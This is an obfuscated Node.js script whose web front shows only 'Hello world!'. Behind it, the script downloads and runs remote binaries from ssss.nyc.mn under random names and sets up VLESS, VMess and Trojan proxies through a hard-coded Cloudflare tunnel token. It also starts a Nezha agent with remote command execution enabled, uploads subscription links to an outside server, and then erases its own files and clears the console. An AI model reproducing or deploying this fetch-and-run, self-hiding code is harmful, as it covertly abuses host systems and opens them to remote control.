const _0xdf9571=_0x4a86;function _0x23bf(){const _0x3dd664=['fileName','exec','utf-8','config.yaml','finish','2096','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','error','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','text/plain;\x20charset=utf-8','5914804SZjEwb','quic','Error\x20in\x20startserver:','charAt','listen','\x0a\x20\x20\x0atrojan://','.exe\x20>\x20nul\x202>&1','Error\x20executing\x20command:\x20','TunnelSecret','del\x20/f\x20/q\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x20>/dev/null\x202>&1','vless','util','\x0avless://','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','list.txt','substring','NEZHA_SERVER','\x0aclient_secret:\x20','arch','false','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Content-Type','set','message','http','https://arm64.ssss.nyc.mn/v1','env','\x20successfully','xtls-rprx-vision','log','NEZHA\x20variable\x20is\x20empty,skip\x20running','/config.json\x20>/dev/null\x202>&1\x20&','2087','AUTO_ACCESS','catch','\x20is\x20running','trim','./tmp','/trojan-argo','isFile','&path=%2Ftrojan-argo%3Fed%3D2560#','aarch64','SERVER_PORT','floor','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Empowerment\x20failed\x20for\x20','1029','toString','forEach','https://amd64.ssss.nyc.mn/agent','then','/dev/null','PORT','tunnel.json','\x20-p\x20','arm','php\x20running\x20error:\x20','path','axios','map','cdns.doon.eu.org','https://oooo.serv00.net/add-url','\x20-c\x20\x22','tls','application/json','FILE_PATH','318ndbSSz','rm\x20-rf\x20','3030246CxLpRl','length','Hello\x20world!','CFIP','filter','readFileSync','--tls','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/vmess-argo','basename','response','taskkill\x20/f\x20/im\x20','abcdefghijklmnopqrstuvwxyz','2445122RwdqbP','App\x20is\x20running','mkdirSync','127.0.0.1','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/api/delete-nodes','/vless-argo','clear','firefox','259424rfEpQN','unshift','Unhandled\x20error\x20in\x20startserver:','NEZHA_PORT','stream','https://arm64.ssss.nyc.mn/agent','none','https://amd64.ssss.nyc.mn/bot','platform','existsSync','ARGO_PORT','from','/api/add-subscriptions','101105EXTbBA','match','Skipping\x20adding\x20automatic\x20access\x20task','Error\x20downloading\x20files:','http\x20server\x20is\x20running\x20on\x20port:','/tunnel.yml\x20run','443','\x0a\x20\x20credentials-file:\x20','web\x20running\x20error:\x20','writeFileSync','423eJjekT','UUID','send','base64','boot.log','pipe','freedom','Download\x20','npm\x20running\x20error:\x20','\x0a\x20\x20\x20\x20','eyJhIjoiZjc5Yjk5ZGY1MmE0NzViMGM4Y2EzNjZkMGEyOTY3NmYiLCJ0IjoiMmY5YTQ3ODQtODExMi00ZWFjLTk1OWItODU1YzEyMjZmZjk3IiwicyI6Ik5tSTJOR0poTnpndFpHRmlZeTAwTVRrMUxXSmtZV1V0TTJWbU5UVm1PR1F4WlRVMCJ9','PROJECT_URL','\x20failed:\x20','3a9e2d7a-8029-4f5d-83af-6e24605c92c4','https+local://8.8.8.8/dns-query','join','20888sndHHw','get','nohup\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','has','trojan','win32','\x22\x20>\x20/dev/null\x202>&1','express','2053','config.json','/api/add-nodes','tcp','child_process','Empowerment\x20success\x20for\x20','data','/sub.txt\x20saved\x20successfully','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','354961TmSzJt','&path=%2Fvless-argo%3Fed%3D2560#','\x20>/dev/null\x202>&1\x20&','CFPORT','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','block','https://arm64.ssss.nyc.mn/web','test','Subscription\x20uploaded\x20successfully','push','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','8443','fileUrl','\x0a\x20\x20tunnel:\x20','post','close','Error\x20reading\x20boot.log:','includes','stringify','tunnel.yml','unlinkSync','all','&fp=firefox&type=ws&host=','true','https://amd64.ssss.nyc.mn/web','chmod','2083','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','random','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','/vmess-argo?ed=2560','split'];_0x23bf=function(){return _0x3dd664;};return _0x23bf();}(function(_0x324264,_0x551dba){const _0x2722b6=_0x4a86,_0x4dc2ca=_0x324264();while(!![]){try{const _0x453c4c=parseInt(_0x2722b6(0xff))/0x1+parseInt(_0x2722b6(0xbd))/0x2+parseInt(_0x2722b6(0xb0))/0x3+-parseInt(_0x2722b6(0xc6))/0x4+-parseInt(_0x2722b6(0xd3))/0x5*(parseInt(_0x2722b6(0xae))/0x6)+-parseInt(_0x2722b6(0x129))/0x7+parseInt(_0x2722b6(0xed))/0x8*(parseInt(_0x2722b6(0xdd))/0x9);if(_0x453c4c===_0x551dba)break;else _0x4dc2ca['push'](_0x4dc2ca['shift']());}catch(_0x403be9){_0x4dc2ca['push'](_0x4dc2ca['shift']());}}}(_0x23bf,0xb1ecc));const express=require(_0xdf9571(0xf5)),app=express(),axios=require(_0xdf9571(0x166)),os=require('os'),fs=require('fs'),path=require(_0xdf9571(0x165)),{promisify}=require(_0xdf9571(0x136)),exec=promisify(require(_0xdf9571(0xfa))[_0xdf9571(0x120)]),{execSync}=require(_0xdf9571(0xfa)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0xdf9571(0x146)][_0xdf9571(0xe8)]||'',AUTO_ACCESS=process[_0xdf9571(0x146)][_0xdf9571(0x14d)]||![],FILE_PATH=process[_0xdf9571(0x146)][_0xdf9571(0xad)]||_0xdf9571(0x151),SUB_PATH=process[_0xdf9571(0x146)]['SUB_PATH']||_0xdf9571(0x15a),PORT=process['env'][_0xdf9571(0x156)]||process[_0xdf9571(0x146)][_0xdf9571(0x160)]||0xbb8,UUID=process[_0xdf9571(0x146)][_0xdf9571(0xde)]||_0xdf9571(0xea),NEZHA_SERVER=process[_0xdf9571(0x146)][_0xdf9571(0x13b)]||'',NEZHA_PORT=process[_0xdf9571(0x146)][_0xdf9571(0xc9)]||'',NEZHA_KEY=process[_0xdf9571(0x146)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0xdf9571(0x146)]['ARGO_DOMAIN']||'qwe131.dacongm.com',ARGO_AUTH=process[_0xdf9571(0x146)]['ARGO_AUTH']||_0xdf9571(0xe7),ARGO_PORT=process[_0xdf9571(0x146)][_0xdf9571(0xd0)]||0x1f41,CFIP=process[_0xdf9571(0x146)][_0xdf9571(0xb3)]||_0xdf9571(0xa8),CFPORT=process[_0xdf9571(0x146)][_0xdf9571(0x102)]||0x1bb,NAME=process[_0xdf9571(0x146)]['NAME']||'';!fs[_0xdf9571(0xcf)](FILE_PATH)?(fs[_0xdf9571(0xbf)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0xdf9571(0x149)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x15b611=_0xdf9571,_0x5ab27f=_0x15b611(0xbc);let _0x21e9da='';for(let _0x520a29=0x0;_0x520a29<0x6;_0x520a29++){_0x21e9da+=_0x5ab27f[_0x15b611(0x12c)](Math[_0x15b611(0x157)](Math[_0x15b611(0x11b)]()*_0x5ab27f[_0x15b611(0xb1)]));}return _0x21e9da;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xdf9571(0xec)](FILE_PATH,npmName),phpPath=path[_0xdf9571(0xec)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0xdf9571(0xec)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0xdf9571(0xec)](FILE_PATH,_0xdf9571(0x139)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0xdf9571(0xec)](FILE_PATH,_0xdf9571(0xf7));function deleteNodes(){const _0x4b0976=_0xdf9571;try{if(!UPLOAD_URL)return;if(!fs[_0x4b0976(0xcf)](subPath))return;let _0x2cef7d;try{_0x2cef7d=fs[_0x4b0976(0xb5)](subPath,_0x4b0976(0x121));}catch{return null;}const _0x33734f=Buffer['from'](_0x2cef7d,'base64')[_0x4b0976(0x15b)](_0x4b0976(0x121)),_0x5972ef=_0x33734f[_0x4b0976(0x11e)]('\x0a')[_0x4b0976(0xb4)](_0x28a235=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4b0976(0x106)](_0x28a235));if(_0x5972ef[_0x4b0976(0xb1)]===0x0)return;return axios[_0x4b0976(0x10d)](UPLOAD_URL+_0x4b0976(0xc2),JSON['stringify']({'nodes':_0x5972ef}),{'headers':{'Content-Type':_0x4b0976(0xac)}})[_0x4b0976(0x14e)](_0xe080df=>{return null;}),null;}catch(_0x268c81){return null;}}function cleanupOldFiles(){const _0x145356=_0xdf9571;try{const _0x407cb3=fs['readdirSync'](FILE_PATH);_0x407cb3[_0x145356(0x15c)](_0x1f0082=>{const _0x2eefa7=_0x145356,_0x1a343b=path['join'](FILE_PATH,_0x1f0082);try{const _0x214df3=fs['statSync'](_0x1a343b);_0x214df3[_0x2eefa7(0x153)]()&&fs[_0x2eefa7(0x113)](_0x1a343b);}catch(_0x576fe8){}});}catch(_0x496ebc){}}app[_0xdf9571(0xee)]('/',function(_0x517457,_0x5990ed){const _0x457d6d=_0xdf9571;_0x5990ed[_0x457d6d(0xdf)](_0x457d6d(0xb2));});async function generateConfig(){const _0x17ea9d=_0xdf9571,_0x1e2be0={'log':{'access':'/dev/null','error':_0x17ea9d(0x15f),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x17ea9d(0x135),'settings':{'clients':[{'id':UUID,'flow':_0x17ea9d(0x148)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x17ea9d(0xc3),'dest':0xbba},{'path':_0x17ea9d(0xb8),'dest':0xbbb},{'path':_0x17ea9d(0x152),'dest':0xbbc}]},'streamSettings':{'network':_0x17ea9d(0xf9)}},{'port':0xbb9,'listen':_0x17ea9d(0xc0),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x17ea9d(0xcc)}},{'port':0xbba,'listen':_0x17ea9d(0xc0),'protocol':_0x17ea9d(0x135),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x17ea9d(0xcc)},'streamSettings':{'network':'ws','security':_0x17ea9d(0xcc),'wsSettings':{'path':_0x17ea9d(0xc3)}},'sniffing':{'enabled':!![],'destOverride':[_0x17ea9d(0x144),_0x17ea9d(0xab),_0x17ea9d(0x12a)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x17ea9d(0xc0),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x17ea9d(0xb8)}},'sniffing':{'enabled':!![],'destOverride':[_0x17ea9d(0x144),_0x17ea9d(0xab),_0x17ea9d(0x12a)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x17ea9d(0xc0),'protocol':_0x17ea9d(0xf2),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x17ea9d(0xcc),'wsSettings':{'path':_0x17ea9d(0x152)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x17ea9d(0x12a)],'metadataOnly':![]}}],'dns':{'servers':[_0x17ea9d(0xeb)]},'outbounds':[{'protocol':_0x17ea9d(0xe3),'tag':'direct'},{'protocol':'blackhole','tag':_0x17ea9d(0x104)}]};fs['writeFileSync'](path[_0x17ea9d(0xec)](FILE_PATH,'config.json'),JSON[_0x17ea9d(0x111)](_0x1e2be0,null,0x2));}function getSystemArchitecture(){const _0xe758f3=_0xdf9571,_0x523672=os[_0xe758f3(0x13d)]();return _0x523672===_0xe758f3(0x163)||_0x523672==='arm64'||_0x523672===_0xe758f3(0x155)?'arm':'amd';}function downloadFile(_0x4c5da1,_0x4c6390,_0x172221){const _0x3c8287=_0xdf9571,_0x2d6e96=_0x4c5da1;!fs[_0x3c8287(0xcf)](FILE_PATH)&&fs[_0x3c8287(0xbf)](FILE_PATH,{'recursive':!![]});const _0x537513=fs['createWriteStream'](_0x2d6e96);axios({'method':_0x3c8287(0xee),'url':_0x4c6390,'responseType':_0x3c8287(0xca)})[_0x3c8287(0x15e)](_0x2514bf=>{const _0x3d6d1a=_0x3c8287;_0x2514bf[_0x3d6d1a(0xfc)][_0x3d6d1a(0xe2)](_0x537513),_0x537513['on'](_0x3d6d1a(0x123),()=>{const _0x58ab14=_0x3d6d1a;_0x537513[_0x58ab14(0x10e)](),console[_0x58ab14(0x149)]('Download\x20'+path[_0x58ab14(0xb9)](_0x2d6e96)+_0x58ab14(0x147)),_0x172221(null,_0x2d6e96);}),_0x537513['on'](_0x3d6d1a(0x126),_0x3993ec=>{const _0x16ecf9=_0x3d6d1a;fs['unlink'](_0x2d6e96,()=>{});const _0x1fcfb2=_0x16ecf9(0xe4)+path[_0x16ecf9(0xb9)](_0x2d6e96)+_0x16ecf9(0xe9)+_0x3993ec[_0x16ecf9(0x143)];console[_0x16ecf9(0x126)](_0x1fcfb2),_0x172221(_0x1fcfb2);});})[_0x3c8287(0x14e)](_0x56dba3=>{const _0x1d7b6d=_0x3c8287,_0x37cb04=_0x1d7b6d(0xe4)+path[_0x1d7b6d(0xb9)](_0x2d6e96)+_0x1d7b6d(0xe9)+_0x56dba3[_0x1d7b6d(0x143)];console[_0x1d7b6d(0x126)](_0x37cb04),_0x172221(_0x37cb04);});}async function downloadFilesAndRun(){const _0x5cbc57=_0xdf9571,_0x47b9f9=getSystemArchitecture(),_0x2a072c=getFilesForArchitecture(_0x47b9f9);if(_0x2a072c['length']===0x0){console[_0x5cbc57(0x149)](_0x5cbc57(0x13f));return;}const _0x21258d=_0x2a072c[_0x5cbc57(0xa7)](_0x9ec41e=>{return new Promise((_0x134987,_0x1cb36f)=>{const _0x24c5b4=_0x4a86;downloadFile(_0x9ec41e[_0x24c5b4(0x11f)],_0x9ec41e[_0x24c5b4(0x10b)],(_0x44959c,_0x430ae4)=>{_0x44959c?_0x1cb36f(_0x44959c):_0x134987(_0x430ae4);});});});try{await Promise[_0x5cbc57(0x114)](_0x21258d);}catch(_0x5881f5){console[_0x5cbc57(0x126)](_0x5cbc57(0xd6),_0x5881f5);return;}function _0x420536(_0x293c67){const _0x5264cf=0x1fd;_0x293c67['forEach'](_0x41c2aa=>{const _0x20ef29=_0x4a86;fs[_0x20ef29(0xcf)](_0x41c2aa)&&fs[_0x20ef29(0x118)](_0x41c2aa,_0x5264cf,_0x3f88c2=>{const _0x2b3fc0=_0x20ef29;_0x3f88c2?console[_0x2b3fc0(0x126)](_0x2b3fc0(0x159)+_0x41c2aa+':\x20'+_0x3f88c2):console[_0x2b3fc0(0x149)](_0x2b3fc0(0xfb)+_0x41c2aa+':\x20'+_0x5264cf[_0x2b3fc0(0x15b)](0x8));});});}const _0x1daf29=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x420536(_0x1daf29);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x13f361=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x49c40c=new Set(['443',_0x5cbc57(0x10a),_0x5cbc57(0x124),_0x5cbc57(0x14c),_0x5cbc57(0x119),_0x5cbc57(0xf6)]),_0x3340ae=_0x49c40c[_0x5cbc57(0xf1)](_0x13f361)?_0x5cbc57(0x116):_0x5cbc57(0x13e),_0x3e38ac=_0x5cbc57(0x13c)+NEZHA_KEY+_0x5cbc57(0xc1)+NEZHA_SERVER+_0x5cbc57(0x11c)+_0x3340ae+_0x5cbc57(0xb7)+UUID;fs[_0x5cbc57(0xdc)](path[_0x5cbc57(0xec)](FILE_PATH,_0x5cbc57(0x122)),_0x3e38ac);const _0x5a2751=_0x5cbc57(0xef)+phpPath+_0x5cbc57(0xaa)+FILE_PATH+_0x5cbc57(0x127);try{await exec(_0x5a2751),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x237caa=>setTimeout(_0x237caa,0x3e8));}catch(_0x3f99c5){console['error'](_0x5cbc57(0x164)+_0x3f99c5);}}else{let _0x59792c='';const _0x2d114e=[_0x5cbc57(0xd9),_0x5cbc57(0x10a),'2096',_0x5cbc57(0x14c),_0x5cbc57(0x119),_0x5cbc57(0xf6)];_0x2d114e['includes'](NEZHA_PORT)&&(_0x59792c=_0x5cbc57(0xb6));const _0x523a66=_0x5cbc57(0xef)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x5cbc57(0x162)+NEZHA_KEY+'\x20'+_0x59792c+_0x5cbc57(0x138);try{await exec(_0x523a66),console[_0x5cbc57(0x149)](npmName+_0x5cbc57(0x14f)),await new Promise(_0x397875=>setTimeout(_0x397875,0x3e8));}catch(_0x5a2823){console[_0x5cbc57(0x126)](_0x5cbc57(0xe5)+_0x5a2823);}}}else console[_0x5cbc57(0x149)](_0x5cbc57(0x14a));const _0x257676=_0x5cbc57(0xef)+webPath+'\x20-c\x20'+FILE_PATH+_0x5cbc57(0x14b);try{await exec(_0x257676),console['log'](webName+_0x5cbc57(0x14f)),await new Promise(_0x1b8215=>setTimeout(_0x1b8215,0x3e8));}catch(_0x312c59){console['error'](_0x5cbc57(0xdb)+_0x312c59);}if(fs[_0x5cbc57(0xcf)](botPath)){let _0x435eab;if(ARGO_AUTH[_0x5cbc57(0xd4)](/^[A-Z0-9a-z=]{120,250}$/))_0x435eab=_0x5cbc57(0x125)+ARGO_AUTH;else ARGO_AUTH[_0x5cbc57(0xd4)](/TunnelSecret/)?_0x435eab=_0x5cbc57(0x11a)+FILE_PATH+_0x5cbc57(0xd8):_0x435eab=_0x5cbc57(0x158)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x5cbc57(0xef)+botPath+'\x20'+_0x435eab+_0x5cbc57(0x101)),console[_0x5cbc57(0x149)](botName+'\x20is\x20running'),await new Promise(_0x4fab54=>setTimeout(_0x4fab54,0x7d0));}catch(_0x36caf7){console[_0x5cbc57(0x126)]('Error\x20executing\x20command:\x20'+_0x36caf7);}}await new Promise(_0x3bbfd3=>setTimeout(_0x3bbfd3,0x1388));}function getFilesForArchitecture(_0x2640d7){const _0x378886=_0xdf9571;let _0x5ed4b9;_0x2640d7==='arm'?_0x5ed4b9=[{'fileName':webPath,'fileUrl':_0x378886(0x105)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x5ed4b9=[{'fileName':webPath,'fileUrl':_0x378886(0x117)},{'fileName':botPath,'fileUrl':_0x378886(0xcd)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x520184=_0x2640d7===_0x378886(0x163)?_0x378886(0xcb):_0x378886(0x15d);_0x5ed4b9[_0x378886(0xc7)]({'fileName':npmPath,'fileUrl':_0x520184});}else{const _0x503ef6=_0x2640d7===_0x378886(0x163)?_0x378886(0x145):'https://amd64.ssss.nyc.mn/v1';_0x5ed4b9['unshift']({'fileName':phpPath,'fileUrl':_0x503ef6});}}return _0x5ed4b9;}function argoType(){const _0x313c19=_0xdf9571;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x313c19(0x149)](_0x313c19(0x103));return;}if(ARGO_AUTH[_0x313c19(0x110)](_0x313c19(0x131))){fs[_0x313c19(0xdc)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x3b7cc5=_0x313c19(0x10c)+ARGO_AUTH['split']('\x22')[0xb]+_0x313c19(0xda)+path['join'](FILE_PATH,_0x313c19(0x161))+_0x313c19(0x133)+ARGO_DOMAIN+_0x313c19(0xfe)+ARGO_PORT+_0x313c19(0x140);fs[_0x313c19(0xdc)](path[_0x313c19(0xec)](FILE_PATH,_0x313c19(0x112)),_0x3b7cc5);}else console[_0x313c19(0x149)](_0x313c19(0xf0));}argoType();async function extractDomains(){const _0x3ef27b=_0xdf9571;let _0x3989ff;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3989ff=ARGO_DOMAIN,console[_0x3ef27b(0x149)]('ARGO_DOMAIN:',_0x3989ff),await _0x2ca230(_0x3989ff);else try{const _0xdc2ae9=fs[_0x3ef27b(0xb5)](path[_0x3ef27b(0xec)](FILE_PATH,_0x3ef27b(0xe1)),'utf-8'),_0x59c3ad=_0xdc2ae9[_0x3ef27b(0x11e)]('\x0a'),_0x2b7805=[];_0x59c3ad[_0x3ef27b(0x15c)](_0x2e2dab=>{const _0x568d5f=_0x3ef27b,_0x136aa7=_0x2e2dab[_0x568d5f(0xd4)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x136aa7){const _0x2c1540=_0x136aa7[0x1];_0x2b7805[_0x568d5f(0x108)](_0x2c1540);}});if(_0x2b7805[_0x3ef27b(0xb1)]>0x0)_0x3989ff=_0x2b7805[0x0],console[_0x3ef27b(0x149)]('ArgoDomain:',_0x3989ff),await _0x2ca230(_0x3989ff);else{console[_0x3ef27b(0x149)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x3ef27b(0x113)](path[_0x3ef27b(0xec)](FILE_PATH,_0x3ef27b(0xe1)));async function _0xeca1ea(){const _0x3606cd=_0x3ef27b;try{process[_0x3606cd(0xce)]===_0x3606cd(0xf3)?await exec(_0x3606cd(0xbb)+botName+_0x3606cd(0x12f)):await exec('pkill\x20-f\x20\x22['+botName[_0x3606cd(0x12c)](0x0)+']'+botName[_0x3606cd(0x13a)](0x1)+_0x3606cd(0xf4));}catch(_0x415f24){}}_0xeca1ea(),await new Promise(_0x3081fc=>setTimeout(_0x3081fc,0xbb8));const _0x397988=_0x3ef27b(0x158)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x3ef27b(0xef)+botPath+'\x20'+_0x397988+_0x3ef27b(0x101)),console[_0x3ef27b(0x149)](botName+_0x3ef27b(0x14f)),await new Promise(_0x2fad62=>setTimeout(_0x2fad62,0xbb8)),await extractDomains();}catch(_0x5e24fb){console['error'](_0x3ef27b(0x130)+_0x5e24fb);}}}catch(_0x619e26){console[_0x3ef27b(0x126)](_0x3ef27b(0x10f),_0x619e26);}async function _0x2ca230(_0x12fd60){const _0xa63c6f=_0x3ef27b,_0x284ed6=execSync(_0xa63c6f(0x109),{'encoding':_0xa63c6f(0x121)}),_0x1ca1cf=_0x284ed6[_0xa63c6f(0x150)](),_0x252585=NAME?NAME+'-'+_0x1ca1cf:_0x1ca1cf;return new Promise(_0x27116a=>{setTimeout(()=>{const _0x595809=_0x4a86,_0x68271={'v':'2','ps':''+_0x252585,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x595809(0xcc),'host':_0x12fd60,'path':_0x595809(0x11d),'tls':_0x595809(0xab),'sni':_0x12fd60,'alpn':'','fp':_0x595809(0xc5)},_0x3ee8b8=_0x595809(0x137)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x12fd60+_0x595809(0x115)+_0x12fd60+_0x595809(0x100)+_0x252585+'\x0a\x20\x20\x0avmess://'+Buffer['from'](JSON[_0x595809(0x111)](_0x68271))[_0x595809(0x15b)](_0x595809(0xe0))+_0x595809(0x12e)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x12fd60+_0x595809(0x115)+_0x12fd60+_0x595809(0x154)+_0x252585+_0x595809(0xe6);console[_0x595809(0x149)](Buffer[_0x595809(0xd1)](_0x3ee8b8)[_0x595809(0x15b)](_0x595809(0xe0))),fs[_0x595809(0xdc)](subPath,Buffer['from'](_0x3ee8b8)[_0x595809(0x15b)](_0x595809(0xe0))),console['log'](FILE_PATH+_0x595809(0xfd)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x194e5e,_0x3dc89c)=>{const _0x1b314d=_0x595809,_0x3d52e8=Buffer[_0x1b314d(0xd1)](_0x3ee8b8)['toString'](_0x1b314d(0xe0));_0x3dc89c[_0x1b314d(0x142)](_0x1b314d(0x141),_0x1b314d(0x128)),_0x3dc89c[_0x1b314d(0xdf)](_0x3d52e8);}),_0x27116a(_0x3ee8b8);},0x7d0);});}}async function uploadNodes(){const _0x535d34=_0xdf9571;if(UPLOAD_URL&&PROJECT_URL){const _0xb9ea7e=PROJECT_URL+'/'+SUB_PATH,_0x4e34bc={'subscription':[_0xb9ea7e]};try{const _0x4b8641=await axios[_0x535d34(0x10d)](UPLOAD_URL+_0x535d34(0xd2),_0x4e34bc,{'headers':{'Content-Type':'application/json'}});return _0x4b8641&&_0x4b8641['status']===0xc8?(console['log'](_0x535d34(0x107)),_0x4b8641):null;}catch(_0x32d59f){if(_0x32d59f[_0x535d34(0xba)]){if(_0x32d59f['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x535d34(0xcf)](listPath))return;const _0x305818=fs[_0x535d34(0xb5)](listPath,'utf-8'),_0x1bfb48=_0x305818[_0x535d34(0x11e)]('\x0a')['filter'](_0x1b8df0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1b8df0));if(_0x1bfb48[_0x535d34(0xb1)]===0x0)return;const _0x38a4b9=JSON['stringify']({'nodes':_0x1bfb48});try{const _0x1261ee=await axios[_0x535d34(0x10d)](UPLOAD_URL+_0x535d34(0xf8),_0x38a4b9,{'headers':{'Content-Type':_0x535d34(0xac)}});return _0x1261ee&&_0x1261ee['status']===0xc8?(console[_0x535d34(0x149)]('Nodes\x20uploaded\x20successfully'),_0x1261ee):null;}catch(_0xfa657c){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3c29d6=_0x4a86,_0x11d2b4=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x11d2b4[_0x3c29d6(0x108)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x11d2b4[_0x3c29d6(0x108)](phpPath);process['platform']==='win32'?exec(_0x3c29d6(0x132)+_0x11d2b4[_0x3c29d6(0xec)]('\x20')+'\x20>\x20nul\x202>&1',_0x402160=>{const _0x3a9da7=_0x3c29d6;console[_0x3a9da7(0xc4)](),console[_0x3a9da7(0x149)](_0x3a9da7(0xbe)),console[_0x3a9da7(0x149)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x3c29d6(0xaf)+_0x11d2b4[_0x3c29d6(0xec)]('\x20')+_0x3c29d6(0x134),_0x2f4376=>{const _0x1c7207=_0x3c29d6;console['clear'](),console[_0x1c7207(0x149)](_0x1c7207(0xbe)),console[_0x1c7207(0x149)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4a6f86=_0xdf9571;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4a6f86(0x149)](_0x4a6f86(0xd5));return;}try{const _0x6189ca=await axios[_0x4a6f86(0x10d)](_0x4a6f86(0xa9),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4a6f86(0xac)}});return console[_0x4a6f86(0x149)]('automatic\x20access\x20task\x20added\x20successfully'),_0x6189ca;}catch(_0x15a815){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x15a815[_0x4a6f86(0x143)]),null;}}async function startserver(){const _0x507b9f=_0xdf9571;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4b858f){console[_0x507b9f(0x126)](_0x507b9f(0x12b),_0x4b858f);}}function _0x4a86(_0x3dbc3f,_0x5b16c0){const _0x23bf27=_0x23bf();return _0x4a86=function(_0x4a8632,_0x259f26){_0x4a8632=_0x4a8632-0xa7;let _0x4002fb=_0x23bf27[_0x4a8632];return _0x4002fb;},_0x4a86(_0x3dbc3f,_0x5b16c0);}startserver()[_0xdf9571(0x14e)](_0x5647e9=>{const _0x5c4df7=_0xdf9571;console[_0x5c4df7(0x126)](_0x5c4df7(0xc8),_0x5647e9);}),app[_0xdf9571(0x12d)](PORT,()=>console[_0xdf9571(0x149)](_0xdf9571(0xd7)+PORT+'!'));
